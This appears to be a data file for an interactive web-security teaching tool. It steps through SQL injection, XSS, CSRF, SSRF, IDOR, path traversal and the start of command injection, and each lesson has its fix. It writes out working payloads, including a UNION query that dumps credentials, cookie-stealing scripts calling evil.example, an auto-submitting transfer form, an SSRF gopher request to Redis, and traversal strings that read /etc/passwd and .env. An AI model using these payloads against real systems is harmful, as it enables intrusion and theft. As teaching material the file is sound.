/* Domain: Web Application Security */

SE.register({
  id: 'sqli', domain: 'web', kind: 'attack', level: 'Beginner', severity: 'Critical',
  name: 'SQL Injection', full: 'Turning user input into database commands',
  tags: ['sqli', 'union', 'database', 'injection', 'mysql'],
  summary: "SQL injection happens when an application builds a database query by gluing user input into SQL text. The attacker's input stops being data and becomes part of the command, so they can read, change or delete data the app never meant to expose.",
  facts: [['Category', 'Injection'], ['OWASP', 'A03:2021 Injection'], ['CWE', 'CWE-89'], ['ATT&CK', 'T1190'], ['Impact', 'Data theft, login bypass, tampering'], ['Root cause', 'String-concatenated SQL']],
  defenses: [
    'Use parameterized queries / prepared statements everywhere',
    'Prefer an ORM or query builder that always binds parameters',
    'Connect with a least-privilege database account',
    'Show generic error pages; keep SQL errors in server logs',
    'Validate input against allow-lists (e.g. numeric IDs only)',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Attacker', sub: '203.0.113.66', x: 120, y: 240 },
    { id: 'web', type: 'server', label: 'Web App', sub: 'shop.example', x: 450, y: 240 },
    { id: 'db', type: 'db', label: 'Database', sub: 'MySQL 10.0.0.5', x: 780, y: 240 },
  ],
  steps: [
    {
      title: 'Normal request', sub: 'How the page is meant to work',
      text: 'A product page reads an `id` from the URL. The vulnerable code builds the query as a string: `"SELECT name, price FROM products WHERE id = " + id`. With honest input, it works fine.',
      fields: [['URL', '/products?id=7'], ['SQL', 'SELECT … WHERE id = 7']],
      packets: [
        ['atk', 'web', 'HTTP', 'GET /products?id=7', 412, 'req'],
        ['web', 'db', 'MySQL', 'SELECT name, price FROM products WHERE id = 7', 96, 'req'],
        ['db', 'web', 'MySQL', 'Result: 1 row', 142, 'res'],
        ['web', 'atk', 'HTTP', 'HTTP/1.1 200 OK (product page)', 5310, 'res'],
      ],
    },
    {
      title: 'Probing with a quote', sub: 'Does input reach the SQL?',
      text: 'The attacker adds a single quote. It unbalances the SQL string and the database throws a syntax error. The app prints that error, which tells the attacker the input lands inside a query.',
      fields: [['Payload', "7'"], ['Signal', 'SQL syntax error leaked']],
      defend: 'Never show database errors to users. A generic 500 page gives attackers far less to work with.',
      packets: [
        ['atk', 'web', 'HTTP', "GET /products?id=7'", 414, 'atk'],
        ['web', 'db', 'MySQL', "SELECT … WHERE id = 7'", 97, 'atk'],
        ['db', 'web', 'MySQL', "ERROR 1064: syntax error near '''", 120, 'res'],
        ['web', 'atk', 'HTTP', 'HTTP/1.1 500 (SQL error shown in page)', 2210, 'data',
          `HTTP/1.1 500 Internal Server Error
Content-Type: text/html

<h1>Database error</h1>
<pre>You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near ''' at line 1</pre>`],
      ],
    },
    {
      title: 'UNION extraction', sub: 'Reading another table',
      text: '`UNION SELECT` appends the attacker\'s own query to the original. The app renders the extra rows as if they were products, so usernames and password hashes show up on the page.',
      fields: [['Payload', '-1 UNION SELECT username, password FROM users-- -'], ['Result', 'Credential table dumped']],
      packets: [
        ['atk', 'web', 'HTTP', 'GET /products?id=-1 UNION SELECT username,password FROM users-- -', 498, 'atk',
          `GET /products?id=-1%20UNION%20SELECT%20username,password%20FROM%20users--%20- HTTP/1.1
Host: shop.example
User-Agent: Mozilla/5.0`],
        ['web', 'db', 'MySQL', 'SELECT name, price FROM products WHERE id = -1 UNION SELECT username, password FROM users-- -', 140, 'atk'],
        ['db', 'web', 'MySQL', 'Result: 3 rows from users', 388, 'data'],
        ['web', 'atk', 'HTTP', 'HTTP/1.1 200 OK (admin:$2y$10$… shown as products)', 5620, 'data'],
      ],
    },
    {
      title: 'Fix: prepared statement', sub: 'Code and data travel separately',
      text: 'With a prepared statement the query shape is sent first (`WHERE id = ?`) and the input is bound later as a plain value. The database never parses the payload as SQL, so it simply finds no product.',
      fields: [['SQL', 'SELECT … WHERE id = ?'], ['Bound value', '"-1 UNION SELECT …" (just text)']],
      defend: 'Parameterized queries fix the root cause. WAF rules and input filters are only extra layers.',
      packets: [
        ['atk', 'web', 'HTTP', 'GET /products?id=-1 UNION SELECT username,password FROM users-- -', 498, 'atk'],
        ['web', 'db', 'MySQL', 'COM_STMT_PREPARE SELECT name, price FROM products WHERE id = ?', 92, 'def'],
        ['web', 'db', 'MySQL', 'COM_STMT_EXECUTE param[0] = "-1 UNION SELECT …"', 110, 'def'],
        ['db', 'web', 'MySQL', 'Result: 0 rows', 40, 'res'],
        ['web', 'atk', 'HTTP', 'HTTP/1.1 404 Not Found', 610, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'xss-reflected', domain: 'web', kind: 'attack', level: 'Beginner', severity: 'High',
  name: 'Reflected XSS', full: 'Cross-site scripting via a crafted link',
  tags: ['xss', 'javascript', 'cookie', 'csp', 'cross-site scripting'],
  summary: 'Reflected cross-site scripting (XSS) happens when a page echoes part of the request (like a search term) back into HTML without encoding it. A crafted link makes the victim\'s browser run the attacker\'s JavaScript inside the trusted site.',
  facts: [['Category', 'Injection (client-side)'], ['OWASP', 'A03:2021 Injection'], ['CWE', 'CWE-79'], ['Delivery', 'Malicious link'], ['Impact', 'Session theft, actions as victim'], ['Runs in', "Victim's browser"]],
  defenses: [
    'Encode output for its context (HTML, attribute, JS, URL)',
    'Use templating that auto-escapes by default',
    'Add a strict Content-Security-Policy (nonces, no inline scripts)',
    'Mark session cookies HttpOnly, Secure and SameSite',
    'Validate input types and lengths',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Attacker', sub: '203.0.113.66', x: 120, y: 110 },
    { id: 'vic', type: 'browser', label: 'Victim Browser', sub: '192.168.1.10', x: 120, y: 380 },
    { id: 'web', type: 'server', label: 'Trusted Site', sub: 'shop.example', x: 520, y: 245 },
    { id: 'col', type: 'server', label: 'Collector', sub: 'evil.example', x: 800, y: 380, evil: true },
  ],
  steps: [
    {
      title: 'Crafting the link', sub: 'Payload hidden in a URL',
      text: 'The attacker finds that `/search?q=` prints the term straight into the page. They put a script in the `q` parameter and send the link to the victim, often shortened or disguised.',
      fields: [['Vulnerable param', 'q'], ['Lure', 'Email / chat message']],
      packets: [
        ['atk', 'vic', 'Email', 'Link: https://shop.example/search?q=<script>…</script>', 1820, 'atk'],
      ],
    },
    {
      title: 'Victim clicks', sub: 'The site reflects the payload',
      text: 'The victim\'s browser requests the trusted site. The server inserts `q` into the HTML unescaped, so the `<script>` tag becomes part of the page.',
      fields: [['Response', 'Payload inside HTML'], ['Origin', 'shop.example (trusted)']],
      packets: [
        ['vic', 'web', 'HTTP', 'GET /search?q=%3Cscript%3Efetch(…)%3C/script%3E', 540, 'atk'],
        ['web', 'vic', 'HTTP', 'HTTP/1.1 200 OK (search page with payload)', 7400, 'atk',
          `<h2>Results for: <script>
  fetch('https://evil.example/c?d=' + encodeURIComponent(document.cookie))
</script></h2>`],
      ],
    },
    {
      title: 'Script executes', sub: 'Running as the trusted site',
      text: 'The browser can\'t tell the injected script from the site\'s own code. It runs with full access to the page, including any cookies that aren\'t `HttpOnly`, and sends them to the attacker.',
      fields: [['Stolen', 'session=7f3a…'], ['Why it works', 'Same-origin trust']],
      packets: [
        ['vic', 'vic', 'JS', 'Injected script runs in shop.example origin', 0, 'atk'],
        ['vic', 'col', 'HTTPS', 'GET /c?d=session%3D7f3a9c…', 380, 'data'],
      ],
    },
    {
      title: 'Session hijack', sub: 'Attacker becomes the victim',
      text: 'The attacker replays the stolen cookie and the site treats them as the logged-in victim.',
      fields: [['Cookie', 'session=7f3a9c…'], ['Access', "Victim's account"]],
      packets: [
        ['atk', 'web', 'HTTP', 'GET /account (Cookie: session=7f3a9c…)', 460, 'atk'],
        ['web', 'atk', 'HTTP', "HTTP/1.1 200 OK (victim's account page)", 9100, 'data'],
      ],
    },
    {
      title: 'Fix: encode + CSP', sub: 'Text stays text',
      text: 'With output encoding the payload renders as harmless `&lt;script&gt;` text. A strict CSP is a second layer: even if something slips through, inline scripts are refused. `HttpOnly` cookies can\'t be read by JavaScript at all.',
      fields: [['Encoding', '< → &lt;'], ['CSP', "script-src 'nonce-r4nd0m'"]],
      defend: 'Use frameworks that auto-escape (React, Angular, modern templating) and avoid raw-HTML sinks like innerHTML.',
      packets: [
        ['vic', 'web', 'HTTP', 'GET /search?q=%3Cscript%3E…', 540, 'atk'],
        ['web', 'vic', 'HTTP', '200 OK — &lt;script&gt; encoded, CSP header set', 7420, 'def',
          `HTTP/1.1 200 OK
Content-Security-Policy: script-src 'nonce-r4nd0m'; object-src 'none'
Set-Cookie: session=7f3a…; HttpOnly; Secure; SameSite=Lax

<h2>Results for: &lt;script&gt;fetch(…)&lt;/script&gt;</h2>`],
        ['vic', 'vic', 'CSP', 'Inline script blocked — nothing executes', 0, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'xss-stored', domain: 'web', kind: 'attack', level: 'Intermediate', severity: 'High',
  name: 'Stored XSS', full: 'Persistent script in saved content',
  tags: ['xss', 'persistent', 'comments', 'dompurify'],
  summary: 'Stored XSS is the persistent form of XSS. The payload is saved on the server (a comment, profile name or ticket) and runs in every visitor\'s browser that views it. No phishing link is needed.',
  facts: [['Category', 'Injection (client-side)'], ['OWASP', 'A03:2021 Injection'], ['CWE', 'CWE-79'], ['Delivery', 'Saved in database'], ['Victims', 'Everyone who views it'], ['Classic example', 'Samy worm (MySpace, 2005)']],
  defenses: [
    'Encode on output, every time content is rendered',
    'Sanitize rich text with a vetted library (e.g. DOMPurify) and an allow-list',
    'Strict Content-Security-Policy',
    'HttpOnly cookies and CSRF tokens for state-changing actions',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Attacker', sub: '203.0.113.66', x: 120, y: 110 },
    { id: 'vic', type: 'browser', label: 'Visitor Browser', sub: '192.168.1.10', x: 120, y: 380 },
    { id: 'web', type: 'server', label: 'Blog App', sub: 'blog.example', x: 450, y: 245 },
    { id: 'db', type: 'db', label: 'Database', sub: 'comments table', x: 790, y: 150 },
    { id: 'col', type: 'server', label: 'Collector', sub: 'evil.example', x: 790, y: 390, evil: true },
  ],
  steps: [
    {
      title: 'Posting the payload', sub: 'Saved like any other comment',
      text: 'The attacker submits a comment containing an image tag with an `onerror` handler. The app saves it as is.',
      fields: [['Payload', '<img src=x onerror=…>'], ['Stored in', 'comments table']],
      packets: [
        ['atk', 'web', 'HTTP', 'POST /post/42/comments body=<img src=x onerror=…>', 690, 'atk',
          `POST /post/42/comments HTTP/1.1
Content-Type: application/x-www-form-urlencoded

body=Nice post! <img src=x onerror="fetch('//evil.example/x?c='+document.cookie)">`],
        ['web', 'db', 'SQL', 'INSERT INTO comments (post_id, body) VALUES (42, ?)', 210, 'atk'],
        ['web', 'atk', 'HTTP', 'HTTP/1.1 201 Created', 180, 'res'],
      ],
    },
    {
      title: 'Visitor loads the page', sub: 'The trap is served',
      text: 'Later, any visitor opens the post. The server pulls comments from the database and writes them into HTML without encoding.',
      fields: [['Visitor', 'Any logged-in user'], ['Interaction needed', 'None (just viewing)']],
      packets: [
        ['vic', 'web', 'HTTP', 'GET /post/42', 420, 'req'],
        ['web', 'db', 'SQL', 'SELECT body FROM comments WHERE post_id = 42', 90, 'req'],
        ['db', 'web', 'SQL', 'Result: 12 rows (1 malicious)', 3100, 'res'],
        ['web', 'vic', 'HTTP', 'HTTP/1.1 200 OK (page with payload)', 18200, 'atk'],
      ],
    },
    {
      title: 'Payload fires', sub: 'Broken image → script',
      text: 'The image fails to load, so `onerror` runs the attacker\'s JavaScript in the blog\'s origin. It sends the visitor\'s cookie to the collector.',
      fields: [['Trigger', 'onerror event'], ['Exfiltrated', 'Session cookie']],
      packets: [
        ['vic', 'vic', 'JS', 'onerror handler runs in blog.example origin', 0, 'atk'],
        ['vic', 'col', 'HTTPS', 'GET /x?c=session%3Dd41f…', 360, 'data'],
      ],
    },
    {
      title: 'Acting as the victim', sub: 'Worm-like spread',
      text: 'Even with `HttpOnly` cookies, the script can still send requests as the victim, such as changing their email or re-posting itself. This is how XSS worms spread.',
      fields: [['Action', 'Change account email'], ['Spread', 'Self-replicating comment']],
      packets: [
        ['vic', 'web', 'HTTP', 'POST /settings/email email=attacker@evil.example (auto)', 520, 'atk'],
        ['web', 'vic', 'HTTP', 'HTTP/1.1 200 OK (email changed)', 240, 'res'],
      ],
    },
    {
      title: 'Fix: sanitize & encode', sub: 'Rendered as text',
      text: 'The app now encodes comment text when rendering it, and sanitizes the few allowed HTML tags with an allow-list. The payload shows as harmless text and no request leaves the browser.',
      fields: [['Output', '&lt;img src=x onerror=…&gt;'], ['Library', 'DOMPurify (allow-list)']],
      defend: 'Encode at render time, not only when saving. Data can enter the database through other paths too.',
      packets: [
        ['vic', 'web', 'HTTP', 'GET /post/42', 420, 'req'],
        ['web', 'vic', 'HTTP', '200 OK — comment HTML-encoded + CSP', 18240, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'csrf', domain: 'web', kind: 'attack', level: 'Beginner', severity: 'High',
  name: 'CSRF', full: 'Cross-Site Request Forgery',
  tags: ['csrf', 'samesite', 'cookie', 'token', 'forgery'],
  summary: 'CSRF tricks a logged-in user\'s browser into sending a request they never intended. Browsers attach cookies automatically, so a hidden form on another site can make a bank transfer, change a password or delete data.',
  facts: [['Category', 'Broken access control'], ['OWASP', 'A01:2021 Broken Access Control'], ['CWE', 'CWE-352'], ['Requires', 'Victim logged in + cookie auth'], ['Impact', 'Unwanted state changes'], ['Modern mitigation', 'SameSite cookies + tokens']],
  defenses: [
    'Anti-CSRF tokens (synchronizer or double-submit) on state-changing requests',
    'Session cookies with SameSite=Lax or Strict',
    'Check Origin / Sec-Fetch-Site headers server-side',
    'Re-authenticate for sensitive actions (transfers, password change)',
    'Never change state with GET requests',
  ],
  nodes: [
    { id: 'vic', type: 'browser', label: 'Victim Browser', sub: 'logged in to bank', x: 130, y: 245 },
    { id: 'bank', type: 'server', label: 'Bank', sub: 'bank.example', x: 640, y: 110 },
    { id: 'evil', type: 'server', label: 'Malicious Site', sub: 'cute-cats.example', x: 640, y: 390, evil: true },
  ],
  steps: [
    {
      title: 'Victim logs in', sub: 'A session cookie is set',
      text: 'The victim signs in to their bank, which sets a session cookie. In this vulnerable setup the cookie has `SameSite=None`, so the browser sends it on requests from any site.',
      fields: [['Cookie', 'session=a91f…; SameSite=None'], ['Auth model', 'Cookie only']],
      packets: [
        ['vic', 'bank', 'HTTPS', 'POST /login user=alice', 640, 'req'],
        ['bank', 'vic', 'HTTPS', '200 OK Set-Cookie: session=a91f…; SameSite=None; Secure', 820, 'ctl'],
      ],
    },
    {
      title: 'Visiting another site', sub: 'A hidden form waits',
      text: 'In another tab the victim opens an innocent-looking page. It contains a hidden form aimed at the bank, plus a script that submits it immediately.',
      fields: [['Page', 'cute-cats.example'], ['Hidden', 'Auto-submitting form']],
      packets: [
        ['vic', 'evil', 'HTTPS', 'GET /funny-cats', 380, 'req'],
        ['evil', 'vic', 'HTTPS', '200 OK (page with hidden auto-submit form)', 4100, 'atk',
          `<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to"     value="attacker-acct">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('f').submit()</script>`],
      ],
    },
    {
      title: 'Forged request', sub: 'The browser adds the cookie',
      text: 'The form POSTs to the bank. The browser attaches the bank\'s session cookie automatically. The bank sees a valid session and moves the money.',
      fields: [['Origin', 'https://cute-cats.example'], ['Result', '$1,000 transferred']],
      packets: [
        ['vic', 'bank', 'HTTPS', 'POST /transfer to=attacker-acct&amount=1000 (Cookie: session=a91f…)', 720, 'atk'],
        ['bank', 'vic', 'HTTPS', '200 OK "Transfer complete"', 1300, 'data'],
      ],
    },
    {
      title: 'Fix: SameSite + token', sub: 'Cross-site requests rejected',
      text: 'With `SameSite=Lax` the browser leaves the cookie off cross-site POSTs. The bank also requires a secret CSRF token that the attacker\'s page can\'t read, and checks the `Origin` header. The forged request fails.',
      fields: [['Cookie', 'SameSite=Lax'], ['Token', 'csrf_token missing → 403']],
      defend: 'Use both: SameSite cookies and CSRF tokens or Origin checks. Older browsers and some flows weaken SameSite alone.',
      packets: [
        ['vic', 'bank', 'HTTPS', 'POST /transfer (no cookie, no csrf_token, Origin: cute-cats.example)', 690, 'atk'],
        ['bank', 'vic', 'HTTPS', '403 Forbidden — CSRF validation failed', 300, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'ssrf', domain: 'web', kind: 'attack', level: 'Intermediate', severity: 'Critical',
  name: 'SSRF', full: 'Server-Side Request Forgery',
  tags: ['ssrf', 'internal', 'pivot', 'gopher', 'url fetch'],
  summary: 'SSRF abuses a server feature that fetches URLs (previews, webhooks, PDF renderers). The attacker points it at internal addresses the firewall would never let them reach directly, so the server becomes their proxy into the private network.',
  facts: [['Category', 'Request forgery'], ['OWASP', 'A10:2021 SSRF'], ['CWE', 'CWE-918'], ['ATT&CK', 'T1190'], ['Typical targets', 'Admin panels, metadata APIs, Redis'], ['See also', 'Cloud → Metadata theft']],
  defenses: [
    'Allow-list destination hosts and schemes (https only)',
    'Resolve DNS first, then block private, loopback and link-local ranges',
    'Disable redirects or re-check every redirect hop',
    'Run fetchers in an isolated network segment with egress rules',
    'Require authentication on internal services too',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Attacker', sub: '203.0.113.66', x: 110, y: 245 },
    { id: 'fw', type: 'firewall', label: 'Perimeter FW', sub: 'allows :443 only', x: 290, y: 245 },
    { id: 'web', type: 'server', label: 'Web App', sub: 'link-preview feature', x: 500, y: 245 },
    { id: 'adm', type: 'server', label: 'Internal Admin', sub: '10.0.0.8:8080', x: 800, y: 110 },
    { id: 'redis', type: 'db', label: 'Redis', sub: '10.0.0.9:6379', x: 800, y: 385 },
  ],
  steps: [
    {
      title: 'Direct access blocked', sub: 'The perimeter works',
      text: 'The attacker tries to reach the internal admin panel directly. The firewall drops it, because private addresses aren\'t reachable from the internet.',
      fields: [['Target', 'http://10.0.0.8:8080/admin'], ['Result', 'Dropped at perimeter']],
      packets: [
        ['atk', 'fw', 'TCP', '→ 10.0.0.8:8080 [SYN]', 66, 'atk'],
        ['fw', 'atk', 'FW', 'DROP (not routable from internet)', 0, 'def'],
      ],
    },
    {
      title: 'A URL-fetching feature', sub: 'The server fetches for you',
      text: 'The app has a link-preview feature: send a URL and the server fetches it to build a thumbnail. Requests come from the server, which sits inside the network.',
      fields: [['Endpoint', 'POST /api/preview'], ['Fetcher location', 'Inside the network']],
      packets: [
        ['atk', 'web', 'HTTPS', 'POST /api/preview {"url":"https://example.org/cat.png"}', 520, 'req'],
        ['web', 'atk', 'HTTPS', '200 OK {"title":"cat.png","thumb":"…"}', 2300, 'res'],
      ],
    },
    {
      title: 'Pointing it inside', sub: 'The server becomes a proxy',
      text: 'The attacker swaps in an internal URL. The server fetches it on their behalf. The admin panel trusts requests from internal IPs, so it answers without asking for a login.',
      fields: [['url', 'http://10.0.0.8:8080/admin'], ['Trust bug', 'Auth by source IP']],
      packets: [
        ['atk', 'web', 'HTTPS', 'POST /api/preview {"url":"http://10.0.0.8:8080/admin"}', 530, 'atk'],
        ['web', 'adm', 'HTTP', 'GET /admin (from 10.0.0.20)', 310, 'atk'],
        ['adm', 'web', 'HTTP', '200 OK (admin dashboard, user list)', 14200, 'data'],
        ['web', 'atk', 'HTTPS', '200 OK (internal page returned in preview)', 14600, 'data'],
      ],
    },
    {
      title: 'Talking to other services', sub: 'Beyond HTTP',
      text: 'If the fetch library supports other schemes such as `gopher://`, the attacker can write raw bytes to internal TCP services like Redis. That can escalate to code execution.',
      fields: [['Scheme', 'gopher://'], ['Target', 'Redis (no auth)']],
      packets: [
        ['atk', 'web', 'HTTPS', 'POST /api/preview {"url":"gopher://10.0.0.9:6379/_SET …"}', 610, 'atk'],
        ['web', 'redis', 'RESP', 'SET / CONFIG SET … (attacker-controlled bytes)', 240, 'atk'],
        ['redis', 'web', 'RESP', '+OK', 5, 'res'],
      ],
    },
    {
      title: 'Fix: validate destinations', sub: 'Allow-list after DNS resolution',
      text: 'The fetcher now resolves the hostname, rejects private, loopback and link-local ranges, allows only `https`, and re-checks every redirect. The internal request never leaves.',
      fields: [['Blocked ranges', '10/8, 172.16/12, 192.168/16, 127/8, 169.254/16'], ['Schemes', 'https only']],
      defend: 'Check the IP after DNS resolution. Attackers use DNS names that resolve to internal IPs, or rebind them after the check.',
      packets: [
        ['atk', 'web', 'HTTPS', 'POST /api/preview {"url":"http://10.0.0.8:8080/admin"}', 530, 'atk'],
        ['web', 'atk', 'HTTPS', '400 Bad Request — destination not allowed', 220, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'idor', domain: 'web', kind: 'attack', level: 'Beginner', severity: 'High',
  name: 'IDOR', full: 'Insecure Direct Object Reference',
  tags: ['idor', 'bola', 'authorization', 'api', 'access control'],
  summary: 'IDOR (called BOLA in APIs) happens when an app accepts an object ID from the user and returns that object without checking who owns it. Changing `1001` to `1002` shows someone else\'s data.',
  facts: [['Category', 'Broken access control'], ['OWASP', 'A01:2021 Broken Access Control'], ['CWE', 'CWE-639'], ['API Top 10', 'API1:2023 BOLA'], ['Skill needed', 'Very low'], ['Impact', 'Mass data exposure']],
  defenses: [
    "Check ownership/permission on every object access, server-side",
    'Scope queries by the authenticated user (WHERE owner_id = ?)',
    'Use random, non-sequential IDs (UUIDs) as defense in depth, not as the fix',
    'Write authorization tests for every endpoint',
    'Rate-limit and alert on enumeration patterns',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Alice (attacker)', sub: 'legit account', x: 120, y: 245 },
    { id: 'api', type: 'api', label: 'Invoice API', sub: 'api.example', x: 450, y: 245 },
    { id: 'db', type: 'db', label: 'Database', sub: 'invoices', x: 780, y: 245 },
  ],
  steps: [
    {
      title: 'Legitimate request', sub: 'Alice views her invoice',
      text: 'Alice is logged in and opens her own invoice, number 1001. Her token proves who she is (authentication), but the API never checks what she may see (authorization).',
      fields: [['Token', 'Bearer eyJ… (alice)'], ['Invoice', '1001 (owner: alice)']],
      packets: [
        ['atk', 'api', 'HTTPS', 'GET /api/invoices/1001 (Bearer alice)', 480, 'req'],
        ['api', 'db', 'SQL', 'SELECT * FROM invoices WHERE id = 1001', 80, 'req'],
        ['db', 'api', 'SQL', 'Row: id=1001 owner=alice', 260, 'res'],
        ['api', 'atk', 'HTTPS', '200 OK {"id":1001,"owner":"alice",…}', 640, 'res'],
      ],
    },
    {
      title: 'Changing the ID', sub: "Bob's invoice is returned",
      text: 'Alice changes the number to 1002. The query looks up only the ID, not the owner, so the API hands over Bob\'s invoice with his address and payment details.',
      fields: [['Requested', '1002'], ['Owner', 'bob ≠ alice']],
      packets: [
        ['atk', 'api', 'HTTPS', 'GET /api/invoices/1002 (Bearer alice)', 480, 'atk'],
        ['api', 'db', 'SQL', 'SELECT * FROM invoices WHERE id = 1002', 80, 'atk'],
        ['db', 'api', 'SQL', 'Row: id=1002 owner=bob', 270, 'data'],
        ['api', 'atk', 'HTTPS', '200 OK {"id":1002,"owner":"bob","card":"**** 4421",…}', 660, 'data'],
      ],
    },
    {
      title: 'Enumeration', sub: 'One script, every customer',
      text: 'Sequential IDs make it trivial to loop over every invoice. A short script downloads the whole table in minutes.',
      fields: [['Range', '1 → 9,999'], ['Leaked', '8,996 invoices']],
      packets: [
        ['atk', 'api', 'HTTPS', 'GET /api/invoices/1003 … /9999 (scripted, 50 req/s)', 4200000, 'atk'],
        ['api', 'atk', 'HTTPS', '200 OK × 8,996 (all customer invoices)', 5800000, 'data'],
      ],
    },
    {
      title: 'Fix: authorize every object', sub: 'Scope by owner',
      text: 'The API now includes the user in the query, `WHERE id = ? AND owner_id = ?`, and returns 404 when nothing matches. That also hides whether the invoice exists.',
      fields: [['Query', '… AND owner_id = alice'], ['Response', '404 (not 403)']],
      defend: 'Put authorization in a central layer (policy middleware) so new endpoints can\'t forget it.',
      packets: [
        ['atk', 'api', 'HTTPS', 'GET /api/invoices/1002 (Bearer alice)', 480, 'atk'],
        ['api', 'db', 'SQL', 'SELECT * FROM invoices WHERE id = 1002 AND owner_id = \'alice\'', 104, 'def'],
        ['db', 'api', 'SQL', 'Result: 0 rows', 40, 'res'],
        ['api', 'atk', 'HTTPS', '404 Not Found', 120, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'path-traversal', domain: 'web', kind: 'attack', level: 'Beginner', severity: 'High',
  name: 'Path Traversal', full: 'Escaping the folder with ../',
  tags: ['directory traversal', 'lfi', 'dot dot slash', 'file read'],
  summary: 'Path traversal happens when a filename from the user is joined onto a directory path. Sequences like `../` climb out of the intended folder, so the attacker can read config files, source code, keys and passwords.',
  facts: [['Category', 'Broken access control'], ['OWASP', 'A01:2021 Broken Access Control'], ['CWE', 'CWE-22'], ['ATT&CK', 'T1190'], ['Common targets', '/etc/passwd, .env, keys'], ['Variants', 'Encoded, double, absolute paths']],
  defenses: [
    'Map user input to IDs, never to raw file paths',
    'Canonicalize the path, then verify it starts with the base directory',
    'Reject path separators and `..` in filenames',
    'Run the app with minimal filesystem permissions or in a container',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Attacker', sub: '203.0.113.66', x: 120, y: 245 },
    { id: 'web', type: 'server', label: 'Web App', sub: 'docs.example', x: 450, y: 245 },
    { id: 'fs', type: 'files', label: 'File System', sub: '/var/www/files/', x: 780, y: 245 },
  ],
  steps: [
    {
      title: 'Normal download', sub: 'Filename from the URL',
      text: 'The app serves documents with `open(BASE + request.file)`. Asking for `report.pdf` reads `/var/www/files/report.pdf` as intended.',
      fields: [['Base dir', '/var/www/files/'], ['File', 'report.pdf']],
      packets: [
        ['atk', 'web', 'HTTP', 'GET /download?file=report.pdf', 400, 'req'],
        ['web', 'fs', 'FS', 'open("/var/www/files/report.pdf")', 0, 'req'],
        ['fs', 'web', 'FS', '84 KB read', 86000, 'res'],
        ['web', 'atk', 'HTTP', '200 OK (application/pdf)', 86400, 'res'],
      ],
    },
    {
      title: 'Climbing out', sub: '../ goes up one folder',
      text: 'Each `../` moves one directory up. Three of them get from `/var/www/files/` back to `/`, and then into `/etc/passwd`.',
      fields: [['Payload', '../../../etc/passwd'], ['Resolved', '/etc/passwd']],
      packets: [
        ['atk', 'web', 'HTTP', 'GET /download?file=../../../etc/passwd', 420, 'atk'],
        ['web', 'fs', 'FS', 'open("/var/www/files/../../../etc/passwd")', 0, 'atk'],
        ['fs', 'web', 'FS', '1.9 KB read (/etc/passwd)', 1900, 'data'],
        ['web', 'atk', 'HTTP', '200 OK "root:x:0:0:root:/root:/bin/bash …"', 2300, 'data'],
      ],
    },
    {
      title: 'Bypassing a weak filter', sub: 'Stripping ../ once is not enough',
      text: 'A developer adds a filter that deletes `../`. The attacker sends `....//`, and after the filter runs it becomes `../` again. URL encoding (`%2e%2e%2f`) slips past naive checks too. The prize: the app\'s `.env` with database credentials.',
      fields: [['Payload', '....//....//app/.env'], ['After filter', '../../app/.env']],
      packets: [
        ['atk', 'web', 'HTTP', 'GET /download?file=....//....//app/.env', 430, 'atk'],
        ['web', 'fs', 'FS', 'open("/var/www/files/../../app/.env")', 0, 'atk'],
        ['fs', 'web', 'FS', '312 B read (.env)', 312, 'data'],
        ['web', 'atk', 'HTTP', '200 OK "DB_PASSWORD=Sup3rS3cret …"', 640, 'data'],
      ],
    },
    {
      title: 'Fix: canonicalize & contain', sub: 'Resolve, then check the prefix',
      text: 'The app now resolves the full path (`realpath`) and refuses anything that doesn\'t start with the base directory. Better still, it serves files by ID from a lookup table.',
      fields: [['Check', 'realpath(p).startsWith(BASE)'], ['Result', '400 Invalid file']],
      defend: 'Blacklist filters lose to encoding tricks. Resolve to a canonical path or use an ID mapping instead.',
      packets: [
        ['atk', 'web', 'HTTP', 'GET /download?file=..%2f..%2f..%2fetc%2fpasswd', 440, 'atk'],
        ['web', 'atk', 'HTTP', '400 Bad Request — invalid file', 180, 'def'],
      ],
    },
  ],
});

SE.register({
  id: 'cmdi', domain: 'web', kind: 'attack', level: 'Intermediate', severity: 'Critical',
  name: 'Command Injection', full: 'OS command injection',
  tags: ['rce', 'shell', 'command injection', 'reverse shell'],
  summary: 'OS command injection happens when an app passes user input to a system shell. Shell characters like `;`, `&&` or `$( )` let the attacker add their own commands, which usually means full remote code execution on the server.',
  facts: [['Category', 'Injection'], ['OWASP', 'A03:2021 Injection'], ['CWE', 'CWE-78'], ['ATT&CK', 'T1059'], ['Impact', 'Remote code execution'], ['Common in', 'Network tools, converters, IoT admin pages']],
  defenses: [
    "Don't call a shell. Use native libraries or exec with an argument array",
    'Strictly validate input (e.g. a regex for a hostname/IP)',
    'Run the service as an unprivileged user in a sandbox/container',
    'Block unexpected outbound connections (egress filtering)',
  ],
  nodes: [
    { id: 'atk', type: 'attacker', label: 'Attacker', sub: '203.0.113.66', x: 120, y: 245 },
    { id: 'web', type: 'server', label: 'Admin Panel', sub: '"Ping a host" tool', x: 450, y: 245 },
    { id: 'sh', type: 'shell', label: 'OS Shell', sub: '/bin/sh as www-data', x: 780, y: 245 },
  ],
  steps: [
    {
      title: 'Normal use', sub: 'A ping diagnostic',
      text: 'The page runs `sh -c "ping -c 1 " + host` and shows the output. Typing an IP address works as intended.',
      fields: [['Input', '8.8.8.8'], ['Command', 'ping -c 1 8.8.8.8']],
      packets: [
        ['atk', 'web', 'HTTP', 'POST /tools/ping host=8.8.8.8', 460, 'req'],
        ['web', 'sh', 'exec', "sh -c 'ping -c 1 8.8.8.8'", 0, 'req'],
        ['sh', 'web', 'stdout', '1 packets transmitted, 1 received', 280, 'res'],
        ['web', 'atk', 'HTTP', '200 OK (ping output)', 900, 'res'],
      ],
    },
    {
      title: 'Injecting a command', sub: '; starts a new command',
      text: 'The attacker adds `; id`. The shell runs ping, then runs `id`, and the output proves the attacker can execute commands as the web server user.',
